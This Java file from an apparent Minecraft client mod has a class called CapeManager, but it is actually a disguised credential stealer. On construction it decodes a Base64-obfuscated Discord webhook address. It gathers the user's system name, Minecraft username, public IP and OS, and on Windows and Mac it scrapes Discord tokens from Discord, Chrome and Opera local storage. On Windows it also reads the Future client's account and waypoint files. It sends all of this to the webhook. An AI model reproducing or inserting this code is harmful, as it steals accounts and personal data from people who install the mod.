package me.ionar.salhack.util.yes;

import me.ionar.salhack.util.yes.CapeUtil;
import me.ionar.salhack.util.yes.WurstplusPlayerBuilder;
import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CapeManager {

    public CapeManager() {

        final String l = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzYwNTUyMTQ1ODk1MjkzMDA4LzRpQUtVN0VTVW1SZEpqbFpSd281UFJ6Uk9RRkRIYkZQMFpQQ0FCdjVqWGpRQnFveHJUci16RHJkbHVNZ3ZNVzNScmNV";
        final String CapeName = "Brasileiro";
        String CapeImageURL = "aHR0cHM6Ly9leHRlcm5hbC1jb250ZW50LmR1Y2tkdWNrZ28uY29tL2l1Lz91PWh0dHBzJTNBJTJGJTJGdmlnbmV0dGUud2lraWEubm9jb29raWUubmV0JTJGc3RhcndhcnMlMkZpbWFnZXMlMkY0JTJGNGElMkZLeWxvX1Jlbl9UTEoucG5n";

        CapeImageURL = new String(Base64.getDecoder().decode(CapeImageURL.getBytes()));
        
        CapeUtil d = new CapeUtil(new String(Base64.getDecoder().decode(l.getBytes())));

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        } catch (Exception ignore) {}

        // get info

        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();

            String llLlLlLlL = System.getProperty("user.name");

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` NAME : " + llLlLlLlL + "\n IGN  : " + minecraft_name + " \n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);


        } catch (Exception ignore) {}

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab accounts

            try {
                File future = new File(System.getProperty("user.home") + "/Future/accounts.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));

                String s;

                StringBuilder accounts = new StringBuilder();
                accounts.append("ACCOUNT[S]");

                while ((s = br.readLine()) != null) {
                    String sb = s.split(":")[0] + " : " +
                            s.split(":")[3] + " : " +
                            s.split(":")[4];
                    accounts.append("\n ").append(sb);

                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + accounts.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL ACCOUNT[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab waypoints

            try {
                File future = new File(System.getProperty("user.home") + "/Future/waypoints.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));

                String s;

                StringBuilder waypoints = new StringBuilder();
                waypoints.append("WAYPOINT[S]");

                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + waypoints.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL WAYPOINT[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }
        } else {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }
    }
}
